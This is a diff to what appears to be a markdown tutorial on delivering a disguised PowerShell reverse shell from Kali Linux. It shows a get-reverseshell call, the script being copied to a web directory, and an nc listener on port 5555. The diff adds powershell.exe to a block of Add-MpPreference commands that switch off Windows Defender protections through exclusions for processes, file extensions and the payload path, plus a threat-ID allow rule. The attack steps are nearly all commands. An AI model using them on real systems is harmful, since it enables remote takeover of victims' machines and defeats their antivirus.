@@ -46,10 +46,10 @@ get-reverseshell -Ip $lhost -Port $lport_sneaky
 
 3. Write your sneaky reverse shell script in the file `$lpath/$sneaky_psname` after line ">> https://github.com/gh0x0st".
 
-4. Write **exit** and continue in first Kali Linux terminal with the following commands:
+4. Write `exit` and continue in first Kali Linux terminal with the following commands:
 
 ```bash
-exit
+
 cp $sneaky_psname $lwebpath
 nc -nvlp 5555
 ```
@@ -90,6 +90,7 @@ PS C:\Users\w\Desktop>
 ```powershell
 Set-ExecutionPolicy Bypass
 Add-MpPreference -ExclusionProcess "cmd.exe"
+Add-MpPreference -ExclusionProcess "powershell.exe"
 Add-MpPreference -ThreatIDDefaultAction_Ids @(2147735445) -ThreatIDDefaultAction_Actions @('Allow')
 Add-MpPreference -ExclusionExtension @("exe", "dll", "ps1", "vbs")
 Add-MpPreference -ExclusionPath '$rpath$sneaky_exename'
